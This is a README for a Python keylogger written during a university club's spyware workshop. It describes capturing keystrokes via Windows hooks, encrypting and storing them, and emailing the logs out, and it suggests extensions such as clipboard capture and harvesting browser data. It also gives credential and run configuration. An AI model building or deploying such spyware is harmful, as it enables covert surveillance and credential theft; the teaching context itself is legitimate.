# A Simple KeyLogger Implementation
This keylogger was implemented during a workshop titled **Spyware introduction** provided by **Securinets** *(cybersec club at INSAT)* 

---
Note : For more clarity on Hooks module please check **Hooks.pdf**
## Feature
* Capture all keystrokes using windows hooks and map them to english alphabet and control caracteres
* Encrypt the keystrokes and save them in local file 
* Send those saved files via email (using powershell)
* Doesn't require any third-party library


## Improvement Ideas
* Screenshot Feature
* Keystrokes analyser (extracting informations)
* Clipboard Logging Feature
* Support other language (example: Russian, Arabic etc)
* Trageting specific softwares (example : targeting webbrowser to collect only critical data)

## How To Run it
* Change the credentiels in **Mailer.py** ( also check your email client denies non secure apps)
```python
REC_ADD = "your email"
SEN_ADD = "your email"
SEN_PASS = "your password"
```
* if you want to use the emailing feature just uncomment in **Hooks.py**
```python
        #mail_result = Mailer.send_mail(f'Log [{name}]','File attached',path)
```
* Second just run the main
```shell
    python ./main.py
```